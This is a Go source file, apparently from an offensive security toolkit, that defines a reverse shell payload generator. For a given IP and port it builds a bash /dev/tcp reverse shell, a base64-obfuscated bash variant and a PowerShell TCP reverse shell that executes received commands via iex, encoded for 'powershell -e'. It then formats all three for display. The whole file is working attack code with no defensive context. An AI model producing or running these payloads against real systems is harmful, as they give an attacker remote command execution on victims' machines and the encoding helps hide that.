package payloads

import (
	"encoding/base64"
	"fmt"
	"strings"
)

// ReverseShellGenerator generates reverse shell payloads
type ReverseShellGenerator struct {
	IP   string
	Port int
}

// NewReverseShellGenerator creates a new reverse shell generator
func NewReverseShellGenerator(ip string, port int) *ReverseShellGenerator {
	return &ReverseShellGenerator{
		IP:   ip,
		Port: port,
	}
}

// GenerateBash generates a bash reverse shell payload
func (r *ReverseShellGenerator) GenerateBash() string {
	return fmt.Sprintf("bash -c 'exec bash >& /dev/tcp/%s/%d 0>&1 &'", r.IP, r.Port)
}

// GenerateBashBase64 generates a base64-encoded bash reverse shell payload
func (r *ReverseShellGenerator) GenerateBashBase64() string {
	payload := r.GenerateBash()
	encoded := base64.StdEncoding.EncodeToString([]byte(payload))
	return fmt.Sprintf("echo %s | base64 -d | bash", encoded)
}

// GeneratePowerShell generates a PowerShell reverse shell payload (base64 encoded)
func (r *ReverseShellGenerator) GeneratePowerShell() string {
	// PowerShell reverse shell script
	psScript := fmt.Sprintf(`$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`, r.IP, r.Port)

	// Encode to UTF-16LE (PowerShell's expected encoding for -EncodedCommand)
	utf16 := encodeUTF16LE(psScript)
	encoded := base64.StdEncoding.EncodeToString(utf16)

	return fmt.Sprintf("cmd /c powershell -e %s", encoded)
}

// encodeUTF16LE encodes a string to UTF-16 Little Endian
func encodeUTF16LE(s string) []byte {
	runes := []rune(s)
	result := make([]byte, len(runes)*2)
	for i, r := range runes {
		result[i*2] = byte(r)
		result[i*2+1] = byte(r >> 8)
	}
	return result
}

// GenerateAll returns all available payloads
func (r *ReverseShellGenerator) GenerateAll() []string {
	return []string{
		r.GenerateBash(),
		r.GenerateBashBase64(),
		r.GeneratePowerShell(),
	}
}

// GetPayloadNames returns the names of all payloads
func (r *ReverseShellGenerator) GetPayloadNames() []string {
	return []string{
		"Bash",
		"Bash (Base64)",
		"PowerShell",
	}
}

// FormatPayloads formats all payloads with their names for display
func (r *ReverseShellGenerator) FormatPayloads() string {
	var sb strings.Builder

	payloads := r.GenerateAll()
	names := r.GetPayloadNames()

	for i, payload := range payloads {
		if i > 0 {
			sb.WriteString("\n\n")
		}
		sb.WriteString(fmt.Sprintf("%s:\n%s", names[i], payload))
	}

	return sb.String()
}
